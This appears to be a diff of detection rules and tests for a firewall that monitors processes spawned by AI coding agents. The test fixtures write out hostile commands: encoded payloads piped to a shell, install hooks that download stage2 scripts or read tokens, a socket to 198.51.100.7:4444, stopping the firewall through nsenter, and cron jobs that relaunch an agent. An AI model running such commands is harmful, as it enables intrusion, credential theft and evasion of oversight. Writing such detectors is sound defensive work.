+        process: { pid: 1160, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "echo NBSWY3DP | base32 -d | sh"] }
+      - name: a packed payload that goes into a shell is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1161, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "cat stage.gz | gunzip | bash -s"] }
+      - name: a backup that goes into the database stays quiet
+        expect: allow
+        process: { pid: 1162, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "zcat dump.sql.gz | psql app"] }
+      - name: a data file that a script reads stays quiet
+        expect: allow
+        process: { pid: 1163, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "zcat data.gz | python3 process.py"] }
+      - name: an install script that the developer downloaded and read stays quiet
+        expect: allow
+        process: { pid: 1164, comm: sh, exe: /usr/bin/sh, argv: [sh, rustup.sh], cwd: /home/dev/app }
+
+  - id: process.text.hidden-characters
+    title: Command line with characters that the screen does not show
+    category: evasion
+    risk: suspicious
+    decision: allow
+    reason: The command holds characters that the terminal does not show. What the user reads on the screen is not what the machine runs.
+    match:
+      any_of:
+        - action: exec
+          argv_matches: '[\x00-\x08\x0b\x0c\x0e-\x1f]|[\x{200b}-\x{200f}\x{2060}\x{2066}-\x{2069}\x{feff}]|[ \t]{20,}'
+        - action: input
+          input_matches: '[\x00-\x08\x0b\x0c\x0e-\x1f]|[\x{200b}-\x{200f}\x{2060}\x{2066}-\x{2069}\x{feff}]'
+    tests:
+      - name: a hidden tail after many blanks is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1170, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "grep Install README.md | head -n 3                        ; ./collect.sh"] }
+      - name: an escape sequence in the command line is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1171, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "echo \u001b[2K\u001b[1A scan complete"] }
+      - name: a colour code that the shell builds stays quiet
+        expect: allow
+        process: { pid: 1172, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "printf '\\033[32mok\\033[0m\\n'"] }
+      - name: a normal search stays quiet
+        expect: allow
+        process: { pid: 1173, comm: grep, exe: /usr/bin/grep, argv: [grep, -n, Setup, README.md] }
+
+  - id: process.install.hook-child
+    title: A package install starts a download or a credential tool
+    category: supply-chain
+    risk: suspicious
+    decision: allow
+    reason: An install script of a package starts a program that fetches data from the network or reads keys. An install needs the compiler tools, and not these.
+    match:
+      action: exec
+      program: [curl, wget, nc, ncat, netcat, gh, glab, ssh, scp, base64, openssl, rundll32, osascript, sudo, doas]
+      ancestor_program: [npm, pnpm, yarn, bun, pip, pip3, uv, poetry, gem, bundle, cargo]
+    tests:
+      - name: a download tool inside an install is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1180, comm: curl, exe: /usr/bin/curl, argv: [curl, -fsSL, "https://example.com/stage2.sh", -o, /var/tmp/s]}
+        ancestry: [{ comm: node }, { comm: npm }, { comm: claude }]
+      - name: a credential tool inside an install is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1181, comm: gh, exe: /usr/bin/gh, argv: [gh, auth, token] }
+        ancestry: [{ comm: node }, { comm: npm }, { comm: bash }]
+      - name: the compiler inside an install stays quiet
+        expect: allow
+        process: { pid: 1182, comm: cc, exe: /usr/bin/cc, argv: [cc, -o, binding.o, binding.c] }
+        ancestry: [{ comm: node-gyp }, { comm: npm }, { comm: bash }]
+      - name: a download from the shell of the user stays quiet
+        expect: allow
+        process: { pid: 1183, comm: curl, exe: /usr/bin/curl, argv: [curl, -sSf, "https://sh.rustup.rs", -o, rustup.sh] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+
+  - id: process.package.ad-hoc-run
+    title: Package that runs without an install step
+    category: supply-chain
+    risk: low
+    decision: allow
+    reason: The command fetches a package and runs it at once, with no question and with no entry in the project files. The firewall writes down which package ran.
+    match:
+      action: exec
+      program: [npx, pnpx, bunx, uvx, pipx, pnpm, yarn, sh, bash, zsh]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:npx|pnpx|bunx)(?:\s|$)'
+            - argv_matches: '(?:^|\s)(?:-y|--yes)(?:\s|$)'
+        - argv_matches: '(?:^|\s)uvx(?:\s|$)'
+        - argv_matches: '(?:^|\s)(?:pnpm|yarn)\s+dlx(?:\s|$)'
+        - argv_matches: '(?:^|\s)pipx\s+run(?:\s|$)'
+    tests:
+      - name: a package that runs without a question is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1190, comm: npx, exe: /usr/bin/npx, argv: [npx, -y, "@iflow-mcp/watercrawl-mcp"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a python package that runs at once is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1191, comm: uvx, exe: /usr/bin/uvx, argv: [uvx, some-helper, --diagnose] }
+      - name: a normal project starter stays quiet
+        expect: allow
+        process: { pid: 1192, comm: npx, exe: /usr/bin/npx, argv: [npx, create-react-app, my-app] }
+      - name: a local tool from the project stays quiet
+        expect: allow
+        process: { pid: 1193, comm: npx, exe: /usr/bin/npx, argv: [npx, tsc, --noEmit], cwd: /home/dev/app }
+
+  - id: process.package.source-override
+    title: Package that comes from another source
+    category: supply-chain
+    risk: suspicious
+    decision: allow
+    reason: The command takes the package from a git address, from a file on a web server or from another registry. The normal review of the registry does not see this code.
+    match:
+      action: exec
+      program: [npm, pnpm, yarn, bun, pip, pip3, uv, cargo, gem, poetry, sudo, sh, bash]
+      all_of:
+        - argv_matches: '(?:^|\s)(?:install|add|i|update|sync)(?:\s|$)'
+        - any_of:
+            - argv_matches: '(?:^|\s)--(?:registry|index-url|extra-index-url|find-links|default-index)[= ]\S+'
+            - argv_matches: 'git\+(?:https?|ssh)://'
+            - argv_matches: 'https?://\S+\.(?:tgz|tar\.gz|whl|zip)(?:\s|$)'
+    tests:
+      - name: an install from another registry is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1200, comm: pip, exe: /usr/bin/pip, argv: [pip, install, requests, --index-url, "https://pypi.attacker.example/simple"] }
+      - name: an install from a git address is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1201, comm: npm, exe: /usr/bin/npm, argv: [npm, install, "git+https://github.com/someone/tool.git"] }
+      - name: a normal install stays quiet
+        expect: allow
+        process: { pid: 1202, comm: npm, exe: /usr/bin/npm, argv: [npm, install] }
+      - name: an install from the requirements file stays quiet
+        expect: allow
+        process: { pid: 1203, comm: pip, exe: /usr/bin/pip, argv: [pip, install, -r, requirements.txt] }
+      - name: a normal build stays quiet
+        expect: allow
+        process: { pid: 1204, comm: cargo, exe: /usr/bin/cargo, argv: [cargo, build], cwd: /home/dev/app }
+
+  - id: process.archive.system-directory
+    title: Files unpacked into a program directory
+    category: evasion
+    risk: suspicious
+    decision: allow
+    reason: The command writes files into a directory where the shell looks for programs. A file there runs later under the name of a normal tool.
+    match:
+      action: exec
+      program: [tar, bsdtar, unzip, cpio, rpm2cpio, ar, dd, sh, bash, zsh, dash, sudo, curl, wget, busybox]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:tar|bsdtar|unzip|cpio|ar|rpm2cpio)(?:\s|$)'
+            - argv_matches: '(?:^|\s)(?:-C|-d|--directory|--target-directory)[= ]\s*(?:/usr/(?:local/)?(?:s?bin|lib\S*)|/s?bin|/lib\S*|/opt|\S*/\.local/bin|~/bin|\S*/\.cargo/bin|\S*/node_modules/\.bin)(?:\s|/|$)'
+        - all_of:
+            - argv_matches: '(?:^|\s)dd(?:\s|$)'
+            - argv_matches: '(?:^|\s)of=(?:/usr/|/lib|/bin|/sbin|/etc/)'
+        - argv_matches: '\|\s*(?:sudo\s+)?(?:\S*/)?(?:tar|bsdtar|unzip|cpio)\b'
+    tests:
+      - name: an unpack into a program directory is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1210, comm: tar, exe: /usr/bin/tar, argv: [tar, xz, -C, /usr/local/bin, --strip-components=1, -f, tool.tgz] }
+      - name: a download that goes straight into an unpacker is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1211, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "curl -fsSL https://get.example.sh | tar xz -C /usr/local/bin"] }
+      - name: a write over a system library is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1212, comm: dd, exe: /usr/bin/dd, argv: [dd, "if=hook.so", "of=/usr/lib/x86_64-linux-gnu/liblzma.so.5"] }
+      - name: an unpack in the project stays quiet
+        expect: allow
+        process: { pid: 1213, comm: tar, exe: /usr/bin/tar, argv: [tar, xzf, release.tgz, -C, ./vendor], cwd: /home/dev/app }
+      - name: a normal container build stays quiet
+        expect: allow
+        process: { pid: 1214, comm: docker, exe: /usr/bin/docker, argv: [docker, build, "."], cwd: /home/dev/app }
+
+  - id: process.namespace.shadow
+    title: Command that changes the meaning of paths or of the network
+    category: evasion
+    risk: suspicious
+    decision: allow
+    reason: The command gives the next program another view of the files or of the network. A path that a person approves can then point to another file.
+    match:
+      action: exec
+      program: [unshare, nsenter, chroot, bwrap, firejail, proot, pivot_root, mount, sudo, doas, sh, bash, zsh]
+      any_of:
+        - argv_matches: '(?:^|\s)(?:unshare|nsenter|chroot|pivot_root)(?:\s|$)'
+        - argv_matches: '(?:^|\s)(?:bwrap|firejail|proot)(?:\s|$)'
+        - argv_matches: '(?:^|\s)mount\s+[^|;]*(?:--bind|-o\s+bind)(?:\s|$)'
+    tests:
+      - name: a private mount view is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1220, comm: unshare, exe: /usr/bin/unshare, argv: [unshare, -m, sh, -c, "mount --bind /var/tmp/fake-passwd /etc/passwd; ./installer"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a step into the namespace of the first process is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1221, comm: nsenter, exe: /usr/bin/nsenter, argv: [nsenter, -t, "1", -m, --, systemctl, stop, agent-firewall] }
+      - name: a normal container build stays quiet
+        expect: allow
+        process: { pid: 1222, comm: docker, exe: /usr/bin/docker, argv: [docker, build, "."], cwd: /home/dev/app }
+      - name: a normal test run stays quiet
+        expect: allow
+        process: { pid: 1223, comm: pytest, exe: /usr/bin/pytest, argv: [pytest, -x] }
+
+  - id: process.retry.bypass-fallback
+    title: A second try that takes a check away
+    category: agent-behavior
+    risk: suspicious
+    decision: allow
+    reason: The command fails and the same line runs it again without a check, or with the rights of the administrator. Each try removes a guard that the first try still kept.
+    match:
+      any_of:
+        - action: exec
+          argv_matches: '\|\|\s*(?:sudo|doas)\s+|(?:\|\||;|&&)\s*[^|;&]*(?:--force|--no-verify|--yolo|--dangerously-skip-permissions|--allow-dirty|--skip-checks)(?:\s|$)|(?:^|\s)chmod\s+(?:-R\s+|--recursive\s+)?777(?:\s|$)'
+        - action: input
+          input_matches: '\|\|\s*(?:sudo|doas)\s+|(?:\|\||;|&&)\s*[^|;&]*(?:--force|--no-verify|--yolo|--dangerously-skip-permissions)(?:\s|$)'
+    tests:
+      - name: a second try with administrator rights is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1230, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "npm install -g eslint || sudo npm install -g eslint"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a second push without the checks is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1231, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "git push origin main || git push --no-verify origin main"] }
+        ancestry: [{ comm: bash }, { comm: cursor-agent }]
+      - name: open rights for everybody are reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1232, comm: chmod, exe: /usr/bin/chmod, argv: [chmod, -R, "777", ./build], cwd: /home/dev/app }
+      - name: a normal chain of commands stays quiet
+        expect: allow
+        process: { pid: 1233, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "cargo build && cargo test"], cwd: /home/dev/app }
+      - name: a normal install script stays quiet
+        expect: allow
+        process: { pid: 1234, comm: bash, exe: /usr/bin/bash, argv: [bash, "scripts/setup.sh"], cwd: /home/dev/app }
+
+  - id: process.interpreter.inline-danger
+    title: Interpreter that starts programs or opens connections in one line
+    category: process
+    risk: suspicious
+    decision: allow
+    reason: The command gives an interpreter a short program that starts other programs or opens a connection. The rules for the normal tools do not see this work.
+    match:
+      action: exec
+      program: [python, python3, node, deno, bun, perl, ruby, php]
+      all_of:
+        - argv_matches: '(?:^|\s)(?:-c|-e|-E|-r|--eval|eval|--exec)(?:\s|$)'
+        - argv_matches: '(?i)(?:os\.system|subprocess\.(?:run|call|Popen|check_output)|urllib\.request|requests\.(?:get|post)|socket\.socket|child_process|execSync|spawnSync|Deno\.(?:run|Command)|system\()'
+    tests:
+      - name: a program start through an interpreter is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1240, comm: node, exe: /usr/bin/node, argv: [node, -e, "require('child_process').execSync('gh auth token')"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a connection through an interpreter is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1241, comm: python3, exe: /usr/bin/python3, argv: [python3, -c, "import socket; socket.socket().connect(('198.51.100.7', 4444))"] }
+      - name: a small calculation stays quiet
+        expect: allow
+        process: { pid: 1242, comm: python3, exe: /usr/bin/python3, argv: [python3, -c, "print(1 + 1)"] }
+      - name: a normal script file stays quiet
+        expect: allow
+        process: { pid: 1243, comm: python3, exe: /usr/bin/python3, argv: [python3, scripts/build.py], cwd: /home/dev/app }
+
+  - id: process.persistence.agent-schedule
+    title: Work for later that starts an agent or changes data
+    category: agent-behavior
+    risk: suspicious
+    decision: allow
+    reason: The command writes a job that runs later with no person present. The job starts an agent or a command that changes data, hours after the session ends.
+    match:
+      any_of:
+        - all_of:
+            - action: exec
+              program: [crontab, at, batch, systemd-run, systemctl, launchctl, schtasks, sh, bash, zsh, sudo]
+            - argv_matches: '(?:^|\s)(?:crontab|at|batch|schtasks)(?:\s|$)|(?:^|\s)systemctl\s+(?:--user\s+)?enable(?:\s|$)|(?:^|\s)systemd-run\b|(?:^|\s)launchctl\s+load(?:\s|$)'
+            - argv_matches: '(?:^|\s|/)(?:claude|codex|gemini|copilot|opencode|aider|cursor-agent|goose)(?:\s|$)|(?:^|\s)(?:rm|curl|wget|git\s+push|npm\s+publish|kubectl|terraform)(?:\s|$)'
+        - all_of:
+            - action: input
+            - input_matches: '(?:^|\s)(?:crontab|at|schtasks)(?:\s|$)'
+            - input_matches: '(?:^|\s|/)(?:claude|codex|gemini|copilot|opencode|aider|cursor-agent|goose)(?:\s|$)'
+    tests:
+      - name: a job that starts an agent again is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1250, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "echo '*/15 * * * * claude -p retry-the-deploy' | crontab -"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a job that deletes files later is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1251, comm: at, exe: /usr/bin/at, argv: [at, now, "+", "2", hours, -f, "rm -rf /home/dev/app/cache"] }
+      - name: a job for the own service stays quiet
+        expect: allow
+        process: { pid: 1252, comm: systemctl, exe: /usr/bin/systemctl, argv: [systemctl, --user, enable, --now, my-app.timer] }
+      - name: a list of the jobs stays quiet
+        expect: allow
+        process: { pid: 1253, comm: crontab, exe: /usr/bin/crontab, argv: [crontab, -l] }
